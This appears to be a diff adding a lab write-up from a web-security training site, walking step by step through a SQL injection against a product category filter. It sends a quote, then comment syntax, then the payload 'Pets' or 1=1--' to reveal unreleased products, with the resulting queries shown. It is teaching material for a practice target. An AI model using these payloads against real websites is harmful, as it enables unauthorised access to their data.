@@ -1,0 +1,41 @@
+Problem Description:
+The given website has some vulernabilty, use it reveal hidden information
+
+End goal:
+Use SQL injection in the URL and display all products, released and unreleased
+
+Analysis:
+
+https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category=Pets
+
+Step 1:
+Check if the given website as SQL injection vulnerability by adding a ' at the end of the URL string
+https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category='
+Command: SELECT * FROM products WHERE category = ''' AND released = 1
+Excecuted Command:  SELECT * FROM products WHERE category = '''
+Observation: Internal server error, as the SQL script has error. This reveals the website is prone to SQL injection attacks.
+
+Step 2:
+Inject SQL without internal server error
+https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category='--
+Command:  SELECT * FROM products WHERE category = ''--' AND released = 1
+Excecuted Command:  SELECT * FROM products WHERE category = ''--
+Observation: The website will not show any products since the filter is empty.
+
+
+Step 3:
+Inject SQL without internal server error, with a product category
+https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category=Pets'--
+Command:  SELECT * FROM products WHERE category = 'Pets'--' AND released = 1
+Excecuted Command:  SELECT * FROM products WHERE category = 'Pets'--
+Observation: The website will show the given filter without any issues as we are commenting out the rest of the SQL clause and syntax errors due to injection
+
+
+Step 4:
+Inject SQL to show all products.
+https://0a0300530485d8d780b1bdd70048001d.web-security-academy.net/filter?category=Pets' or 1=1--
+Command: SELECT * FROM products WHERE category = 'Pets' or 1=1--' AND released = 1
+Excecuted Command: SELECT * FROM products WHERE category = 'Pets' or 1=1--
+Observation: Since we don't know if there's a filter to show all categories, we add an TRUE with OR so that where clause is always true regardless
+    of the category filter. This will display all products released or unrealeased. 
+
